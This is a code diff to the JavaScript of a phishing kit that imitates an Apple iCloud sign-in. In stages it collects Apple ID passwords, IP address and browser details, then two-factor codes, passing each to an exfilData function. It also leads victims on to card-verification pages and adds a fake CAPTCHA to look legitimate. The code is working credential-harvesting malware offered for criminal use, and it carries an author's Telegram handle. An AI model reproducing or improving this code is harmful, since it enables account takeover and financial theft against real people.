@@ -3,9 +3,9 @@ document.addEventListener('DOMContentLoaded', function() {
     const twoFactorForm = document.getElementById('twoFactorForm');
     const cardForm = document.getElementById('cardForm');
     const secondCardForm = document.getElementById('secondCardForm');
+    const loginPage = document.getElementById('loginForm');
     const twoFactorPage = document.getElementById('twoFactorPage');
     const cardVerifyPage = document.getElementById('cardVerifyPage');
-    const pageContainer = document.getElementById('pageContainer');
     const declinedMsg = document.getElementById('declinedMsg');
 
     // Stage 1: Login Harvest
@@ -14,6 +14,13 @@ document.addEventListener('DOMContentLoaded', function() {
         const appleId = document.getElementById('appleId').value;
         const password = document.getElementById('password').value;
         const keepSignedIn = document.getElementById('keepSignedIn').checked;
+        const notRobot = document.getElementById('notRobot').checked;
+
+        // CAPTCHA Check
+        if (!notRobot) {
+            alert('Please verify you are not a robot.');
+            return;
+        }
 
         // Fake Processing
         const submitBtn = loginForm.querySelector('.submit-btn');
@@ -28,10 +35,11 @@ document.addEventListener('DOMContentLoaded', function() {
                 const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: ${ip}\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
                 window.exfilData(loginData);
 
-                // Show 2FA Page
+                // Load 2FA Page
                 setTimeout(() => {
-                    pageContainer.style.display = 'none';
+                    loginPage.classList.add('hidden');
                     twoFactorPage.classList.remove('hidden');
+                    submitBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M8.5 5.5L15.5 12L8.5 18.5" stroke="white" stroke-width="2"/></svg>';
                 }, 1500);
             })
             .catch(() => {
@@ -39,8 +47,9 @@ document.addEventListener('DOMContentLoaded', function() {
                 const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: Unknown\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
                 window.exfilData(loginData);
                 setTimeout(() => {
-                    pageContainer.style.display = 'none';
+                    loginPage.classList.add('hidden');
                     twoFactorPage.classList.remove('hidden');
+                    submitBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M8.5 5.5L15.5 12L8.5 18.5" stroke="white" stroke-width="2"/></svg>';
                 }, 1500);
             });
     });
@@ -54,7 +63,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const twoFaData = `🔑 2FA Code: ${code}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
         window.exfilData(twoFaData);
 
-        // Show Card Verification
+        // Load Card Verification Page
         setTimeout(() => {
             twoFactorPage.classList.add('hidden');
             cardVerifyPage.classList.remove('hidden');
